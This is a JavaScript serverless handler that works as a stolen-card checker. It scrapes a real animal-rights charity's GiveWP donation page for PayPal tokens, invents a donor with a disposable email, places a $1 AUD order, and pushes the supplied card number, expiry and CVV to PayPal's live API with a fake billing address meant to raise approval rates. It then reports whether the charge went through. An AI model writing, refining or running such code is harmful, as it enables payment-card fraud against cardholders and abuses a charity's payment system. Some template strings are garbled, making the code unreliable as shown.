const cookieJar = new Map();

const randomString = (length) =>
    Array(length)
        .fill(0)
        .map(() => 'abcdefghijklmnopqrstuvwxyz'[Math.floor(Math.random() * 26)])
        .join('');

async function getPublicEmail() {
    try {
        const domainRes  = await fetch('https://api.mail.gw/domains');
        const domainData = await domainRes.json();
        const domain     = domainData['hydra:member']?.[0]?.domain;
        if (domain) return `\( {randomString(10)}@ \){domain}`;
    } catch {}
    return `${randomString(10)}@outlook.com`;
}

async function request(url, options = {}) {
    const headers = new Headers(options.headers || {});

    const cookieString = Array.from(cookieJar)
        .map(([k, v]) => `\( {k}= \){v}`)
        .join('; ');

    if (cookieString) headers.set('cookie', cookieString);
    if (!headers.has('user-agent')) {
        headers.set('user-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36');
    }

    const response = await fetch(url, { ...options, headers });

    // Handle Set-Cookie (Node 18+ fetch supports getSetCookie)
    const setCookies = response.headers.getSetCookie?.() || [];
    for (const cookie of setCookies) {
        const [pair] = cookie.split(';');
        const [name, value] = pair.split('=').map(s => s.trim());
        if (name && value) cookieJar.set(name, value);
    }

    return response;
}

export default async function handler(req, res) {
    cookieJar.clear(); // fresh session per request

    const { data: inputData } = req.query;
    if (!inputData) {
        return res.status(400).json({ error: 'Usage: /api?data=number|mm|yy|cvv' });
    }

    const [number, month, yearShort, cvv] = inputData.split('|');
    if (!number || !month || !yearShort || !cvv) {
        return res.status(400).json({ error: 'Invalid card format' });
    }

    const email = await getPublicEmail();
    const user = {
        firstName: randomString(6),
        lastName: randomString(6),
        email,
    };

    try {
        // ────────────────────────────────────────────────
        // 1. Scrape form → get settings / tokens
        // ────────────────────────────────────────────────
        const html = await (await request('https://animalrights.org.au/donate-now/')).text();
        const formUrlMatch = html.match(/data-form-view-url=['"]([^'"]+)['"]/);
        if (!formUrlMatch) throw new Error("Cannot find form URL");

        const formUrl = formUrlMatch[1].replace(/&amp;/g, '&');
        const formText = await (await request(formUrl)).text();

        const exportedMatch = formText.match(/window\.givewpDonationFormExports\s*=\s*({[\s\S]*?});/);
        if (!exportedMatch) throw new Error("Cannot find givewpDonationFormExports");

        const data = JSON.parse(exportedMatch[1]);
        const gateway = data.registeredGateways.find(g => g.id === 'paypal-commerce');
        if (!gateway) throw new Error("paypal-commerce gateway not found");

        const settings = gateway.settings;
        const clientId = settings.sdkOptions?.clientId;
        if (!clientId) throw new Error("No PayPal clientId found");

        // ────────────────────────────────────────────────
        // 2. Get PayPal access token (client credentials)
        // ────────────────────────────────────────────────
        const auth = Buffer.from(`${clientId}:`).toString('base64');
        const tokenRes = await request('https://api.paypal.com/v1/oauth2/token', {   // ← use api.paypal.com (live)
            method: 'POST',
            headers: {
                'Authorization': `Basic ${auth}`,
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: 'grant_type=client_credentials'
        });

        if (!tokenRes.ok) throw new Error(`PayPal auth failed: ${await tokenRes.text()}`);

        const { access_token: accessToken } = await tokenRes.json();
        if (!accessToken) throw new Error("No access_token");

        // ────────────────────────────────────────────────
        // 3. Create order via GiveWP ajax
        // ────────────────────────────────────────────────
        const params = new URLSearchParams(new URL(data.donateUrl).search);
        const tokens = {
            formId: settings.donationFormId.toString(),
            formHash: settings.donationFormNonce,
            signature: params.get('givewp-route-signature'),
            signatureId: params.get('givewp-route-signature-id'),
            signatureExp: params.get('givewp-route-signature-expiration'),
        };

        const orderFormData = new FormData();
        orderFormData.append('action', 'give_paypal_commerce_create_order');
        orderFormData.append('give-form-id', tokens.formId);
        orderFormData.append('give-form-hash', tokens.formHash);
        orderFormData.append('give_payment_mode', 'paypal-commerce');
        orderFormData.append('give-amount', '1');
        orderFormData.append('give_first', user.firstName);
        orderFormData.append('give_last', user.lastName);
        orderFormData.append('give_email', user.email);
        orderFormData.append('give-cs-form-currency', 'AUD');

        const orderRes = await request('https://animalrights.org.au/wp-admin/admin-ajax.php', {
            method: 'POST',
            body: orderFormData,
        });

        if (!orderRes.ok) throw new Error(`Create order ajax failed: ${await orderRes.text()}`);

        const orderJson = await orderRes.json();
        const orderId = orderJson?.data?.id || orderJson?.id;

        if (!orderId) {
            console.error("Order creation response:", orderJson);
            throw new Error("No order ID returned from GiveWP");
        }

        // ────────────────────────────────────────────────
        // 4. Try to supply card → prefer PATCH then capture
        // ────────────────────────────────────────────────
        const patchRes = await request(
            `https://api.paypal.com/v2/checkout/orders/${orderId}`,
            {
                method: 'PATCH',
                headers: {
                    'Authorization': `Bearer ${accessToken}`,
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify([{
                    op: "replace",
                    path: "/payment_source",
                    value: {
                        card: {
                            number,
                            security_code: cvv,
                            expiry: `\( {month.padStart(2,'0')}/20 \){yearShort}`,
                            name: `${user.firstName} ${user.lastName}`,
                            billing_address: {  // helps approval rate sometimes
                                address_line_1: "123 Fake St",
                                admin_area_2: "Indore",
                                admin_area_1: "MP",
                                postal_code: "452001",
                                country_code: "IN"
                            }
                        }
                    }
                }])
            }
        );

        let confirmData;
        if (patchRes.ok) {
            // If PATCH accepted → try to capture
            const captureRes = await request(
                `https://api.paypal.com/v2/checkout/orders/${orderId}/capture`,
                {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${accessToken}`,
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({})
                }
            );

            confirmData = await captureRes.json();
        } else {
            // Fallback to old confirm-payment-source (some old integrations still accept it)
            const confirmRes = await request(
                `https://api.paypal.com/v2/checkout/orders/${orderId}/confirm-payment-source`,
                {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${accessToken}`,
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        payment_source: {
                            card: {
                                number,
                                security_code: cvv,
                                expiry: `\( {month.padStart(2,'0')}/20 \){yearShort}`,
                                name: `${user.firstName} ${user.lastName}`,
                            }
                        }
                    })
                }
            );

            confirmData = await confirmRes.json();
        }

        // ────────────────────────────────────────────────
        // 5. Return PayPal response directly — most useful for debugging
        // ────────────────────────────────────────────────
        res.status(confirmData.status === 'COMPLETED' || confirmData.status === 'APPROVED' ? 200 : 402)
            .json({
                paypal_response: confirmData,
                orderId,
                message: confirmData.status || confirmData.name || "Unknown status"
            });

    } catch (error) {
        console.error(error);
        res.status(500).json({
            error: error.message,
            stack: error.stack?.split('\n').slice(0,3)
        });
    }
}
